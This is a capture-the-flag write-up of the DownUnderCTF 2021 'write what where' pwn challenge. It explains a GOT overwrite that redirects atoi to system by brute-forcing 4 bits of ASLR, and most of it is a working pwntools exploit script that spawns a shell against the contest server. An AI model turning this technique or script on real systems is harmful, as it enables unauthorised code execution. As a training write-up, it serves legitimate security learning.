​**"Write what were"**

was a pwn challenge from DownUnderCTF 2021,

an easy one, were you can write a value to an address, in oneshot.. classical problem so..

let's check the protections.

![](https://github.com/nobodyisnobody/write-ups/raw/main/DownUnderCTF.2021/pwn/write.what.where/pics/checksec.png)

ok no PIE, GOT is writable..

let's have a look to the program.

![](https://github.com/nobodyisnobody/write-ups/raw/main/DownUnderCTF.2021/pwn/write.what.where/pics/reverse.png)

well nothing much to say, read an address, read value, write the value to this address..

the libc is given, so we know the different function offsets..

we will replace atoi function two lsb bytes, by system function two lsb byte, 4 bits of ASLR will be left to guess, which is very fast...

then when the replace works, the input value from 'where?', will be passed to system()

let's see in action (for the pleasure of animated gif :) )

![](https://github.com/nobodyisnobody/write-ups/raw/main/DownUnderCTF.2021/pwn/write.what.where/pics/gotshell.gif)

and here is the exploit code.

```python3
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'error'

exe = ELF('./write-what-where')

host, port = "pwn-2021.duc.tf","31920"

print('trying bruteforce of 4bits aslr...')
count = 0
while (True):
  print(str(count))
  count +=1
  if args.LOCAL:
    p = process(exe.path)
  else:
    p = remote(host,port)
  # first we replace exit got entry, by _start address, to do a ret2start
  p.sendafter('what?\n', p32(exe.sym['_start']))
  p.sendafter('where?\n',str(exe.got['exit']))

  # then we replace two lsb bytes of atoi got entry, by two lsb byte of system offset (needs 4 bits bruteforce)
  p.sendafter('what?\n', p32(0xda600000))
  p.sendafter('where?\n',str(exe.got['atoi']-2))

  # in case of aslr bruteforce success, atoi points now to system, so 'where?' input value, will be passed to system, we send '/bin/sh'
  p.sendafter('what?\n', p32(0xda600000))
  p.sendafter('where?\n', '/bin/sh')

  # let's try if it works
#  p.sendline('id;cat flag*')
  try:
    p.sendline('id;cat flag*')
    # if we receive back 'uid' , it worked..
    buff = p.recvuntil('uid', timeout=2)
    if 'uid' not in buff:
      continue
    break
  except:
    # if not , close connection try again
    p.close()

print(buff)
p.interactive()

```

*nobodyisnobody still pwning things..*

